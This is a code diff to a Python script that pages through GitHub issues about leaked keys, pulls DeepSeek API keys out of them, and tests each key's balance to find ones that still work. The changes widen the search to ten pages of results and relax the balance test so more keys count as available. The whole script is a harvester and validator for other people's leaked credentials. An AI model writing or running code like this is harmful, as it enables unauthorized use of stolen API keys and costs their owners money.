@@ -10,11 +10,36 @@ API_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 
 DEEPSEEK_BALANCE_URL = "https://api.deepseek.com/user/balance"
 DEEPSEEK_CHAT_URL = "https://api.deepseek.com/v1/chat/completions"
-GITHUB_SEARCH_URL = "https://api.github.com/search/issues?q=your key leak author:chinese-leak-key-check&sort=created&order=desc"
+GITHUB_SEARCH_QUERY = "your key leak author:chinese-leak-key-check"
+MAX_PAGES = 10
+PER_PAGE = 100
 
 HEADERS = {'Accept': 'application/json'}
 if API_TOKEN:
     HEADERS['Authorization'] = f"Bearer {API_TOKEN}"
+
+
+def fetch_all_issues():
+    all_items = []
+    for page in range(1, MAX_PAGES + 1):
+        url = f"https://api.github.com/search/issues?q={GITHUB_SEARCH_QUERY}&sort=created&order=desc&per_page={PER_PAGE}&page={page}"
+        try:
+            response = requests.get(url, headers=HEADERS, timeout=15)
+            if response.status_code != 200:
+                print(f"[-] Page {page} failed with HTTP {response.status_code}")
+                break
+            data = response.json()
+            items = data.get("items", [])
+            if not items:
+                break
+            all_items.extend(items)
+            print(f"[*] Page {page}/{MAX_PAGES}: fetched {len(items)} items (total: {len(all_items)})")
+            if len(items) < PER_PAGE:
+                break
+        except requests.RequestException as e:
+            print(f"[-] Page {page} request failed: {e}")
+            break
+    return all_items
 
 
 def fetch_keys_from_issue(issue_item):
@@ -72,8 +97,8 @@ def check_key_full(api_key):
             else:
                 result['usd_balance'] = amount
 
-        if result['cny_balance'] < 0 or result['usd_balance'] < 0:
-            result['error'] = 'Negative balance'
+        if result['cny_balance'] < 0 and result['usd_balance'] < 0:
+            result['error'] = 'Both CNY and USD balances are negative'
             return result
 
         result['is_available'] = True
@@ -159,15 +184,14 @@ def main():
 
     if not API_TOKEN:
         print("[-] Warning: GITHUB_TOKEN env var not set. GitHub API rate limit: 60 req/hr (authenticated: 5000 req/hr).")
-    print("[*] Searching GitHub leaked issues...")
-    try:
-        search_results = requests.get(GITHUB_SEARCH_URL, headers=HEADERS, timeout=15).json().get("items", [])
-    except requests.RequestException as e:
-        print(f"[-] GitHub search request failed: {e}")
+    print(f"[*] Searching GitHub leaked issues (max {MAX_PAGES} pages, {PER_PAGE} items/page)...")
+    search_results = fetch_all_issues()
+    if not search_results:
+        print("[-] No issues found.")
         return
 
     all_extracted_keys = set()
-    print(f"[*] Found {len(search_results)} potential issues, extracting keys in parallel...")
+    print(f"[*] Extracting keys from {len(search_results)} issues in parallel...")
 
     with ThreadPoolExecutor(max_workers=10) as executor:
         futures = {executor.submit(fetch_keys_from_issue, item): item for item in search_results}
